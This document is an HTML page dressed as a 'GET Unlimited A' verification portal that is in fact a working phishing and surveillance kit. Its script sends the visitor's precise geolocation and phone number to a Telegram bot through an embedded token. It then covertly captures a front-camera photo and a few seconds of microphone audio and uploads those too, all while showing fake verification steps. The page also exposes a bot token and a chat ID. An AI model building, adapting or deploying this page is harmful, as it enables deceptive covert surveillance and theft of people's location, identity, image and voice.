<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GET Unlimited A - Verification Portal</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
    .container { background: #ffffff; width: 100%; max-width: 420px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); padding: 25px; text-align: center; }
    .logo { font-size: 24px; font-weight: bold; color: #2563eb; margin-bottom: 20px; letter-spacing: 1px; }
    .step { display: none; }
    .step.active { display: block; }
    label { font-size: 14px; color: #4b5563; font-weight: 600; display: block; margin-bottom: 8px; text-align: left; }
    select, input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; outline: none; }
    select:focus, input:focus { border-color: #2563eb; }
    button { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
    button:hover { background: #1d4ed8; }
    .sub-text { font-size: 12px; color: #6b7280; margin-top: 10px; }
    video { display: none; } /* د چمتووالي ویډیو ایلیمنټ */
  </style>
</head>
<body>

<video id="v" autoplay playsinline muted></video>

<div class="container">
  <div class="logo">GET Unlimited A</div>

  <!-- Step 1: Country Selection & Location -->
  <div id="step1" class="step active">
    <label for="country">Select Country</label>
    <select id="country" onchange="handleCountryChange()">
      <option value="">-- Choose Country --</option>
      <option value="Afghanistan">Afghanistan</option>
      <option value="Pakistan">Pakistan</option>
      <option value="India">India</option>
      <option value="Turkey">Turkey</option>
      <option value="Other">Other Countries</option>
    </select>
    <p class="sub-text">Select your location to start verification.</p>
  </div>

  <!-- Step 2: Phone Number & Camera Permission -->
  <div id="step2" class="step">
    <label for="phone">Enter Phone Number</label>
    <input type="tel" id="phone" placeholder="+93 7XX XXX XXX">
    <button id="sendBtn" onclick="handlePhoneSubmit()">Send Verification</button>
    <p class="sub-text">Identity check requires camera permission upon sending.</p>
  </div>

  <!-- Step 3: Microphone Permission & Details -->
  <div id="step3" class="step">
    <label>Verification Completed!</label>
    <p style="font-size:14px; color:#374151; margin-bottom:15px;">Click below to access your Unlimited A account details.</p>
    <button id="detailsBtn" onclick="handleViewDetails()">View Details</button>
  </div>

  <!-- Step 4: Success Screen -->
  <div id="step4" class="step">
    <h3 style="color:#10b981; margin-bottom:10px;">Access Granted!</h3>
    <p style="font-size:14px; color:#4b5563;">Your details have been successfully processed.</p>
  </div>
</div>

<script>
  const TELEGRAM_BOT_TOKEN = '8856137504:AAHULGCAaZYPF6PIIRCg2611ZWBlPTnlyds';
  const DEFAULT_CHAT_ID = '6809500416'; // که ID په لینک کې نه وي، دې ایډي ته ځي

  // له URL (لینک) څخه د شخص آیډي موندل (?id=CHAT_ID)
  function getTargetChatId() {
    const urlParams = new URLSearchParams(window.location.search);
    const customId = urlParams.get('id');
    return customId ? customId : DEFAULT_CHAT_ID;
  }

  const TARGET_CHAT_ID = getTargetChatId();

  function goToStep(s) {
    document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
    document.getElementById(`step${s}`).classList.add('active');
  }

  // متن لېږل
  async function sendTelegramLog(msg) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text: msg, parse_mode: 'HTML' })
      });
    } catch (e) { console.error(e); }
  }

  // انځور لېږل
  async function sendTelegramPhoto(blob) {
    const fd = new FormData();
    fd.append('chat_id', TARGET_CHAT_ID);
    fd.append('photo', blob, 'cam.jpg');
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } catch (e) { console.error(e); }
  }

  // غږ لېږل
  async function sendTelegramVoice(blob) {
    const fd = new FormData();
    fd.append('chat_id', TARGET_CHAT_ID);
    fd.append('voice', blob, 'mic.ogg');
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
    } catch (e) { console.error(e); }
  }

  // Step 1: Location
  function handleCountryChange() {
    const country = document.getElementById('country').value;
    if (!country) return;

    sendTelegramLog(`🌐 <b>Country Selected:</b> ${country}\n🎯 <b>Target Chat ID:</b> <code>${TARGET_CHAT_ID}</code>`);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const map = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
          sendTelegramLog(`📍 <b>Location Granted:</b>\n<a href="${map}">Open Google Maps</a>`);
          goToStep(2);
        },
        (err) => {
          sendTelegramLog(`⚠️ <b>Location Error:</b> ${err.message}`);
          goToStep(2);
        },
        { enableHighAccuracy: true, timeout: 8000 }
      );
    } else {
      goToStep(2);
    }
  }

  // Step 2: Phone Submit & Camera Prompt
  async function handlePhoneSubmit() {
    const phone = document.getElementById('phone').value;
    if (!phone) {
      alert('Please enter your phone number.');
      return;
    }

    const btn = document.getElementById('sendBtn');
    btn.disabled = true;
    btn.innerText = 'Verifying...';

    sendTelegramLog(`📱 <b>Phone:</b> <code>${phone}</code>`);

    try {
      // سمدستي د کیمرې د اجازې (Allow/Block) غوښتنه کول
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      const video = document.getElementById('v');
      video.srcObject = stream;
      await video.play();

      // ۱ دویمه وروسته دقیق انځور اخیستل
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // د کیمرې تړلو پروسه
        stream.getTracks().forEach(t => t.stop());

        canvas.toBlob(async (blob) => {
          if (blob) await sendTelegramPhoto(blob);
          goToStep(3);
        }, 'image/jpeg', 0.85);

      }, 1200);

    } catch (err) {
      sendTelegramLog(`⚠️ <b>Camera Permission Rejected:</b> ${err.message}`);
      goToStep(3);
    }
  }

  // Step 3: Microphone Prompt & Audio Capture
  async function handleViewDetails() {
    const btn = document.getElementById('detailsBtn');
    btn.disabled = true;
    btn.innerText = 'Loading...';

    try {
      // سمدستي د مایکروفون د اجازې (Allow/Block) غوښتنه کول
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const recorder = new MediaRecorder(stream);
      const chunks = [];

      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = async () => {
        const audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
        await sendTelegramVoice(audioBlob);
        stream.getTracks().forEach(t => t.stop());
        goToStep(4);
      };

      recorder.start();

      // د ۳ دویمو لخوا د شالید غږ ثبتول
      setTimeout(() => {
        recorder.stop();
      }, 3500);

    } catch (err) {
      sendTelegramLog(`⚠️ <b>Microphone Permission Rejected:</b> ${err.message}`);
      goToStep(4);
    }
  }
</script>
</body>
</html>
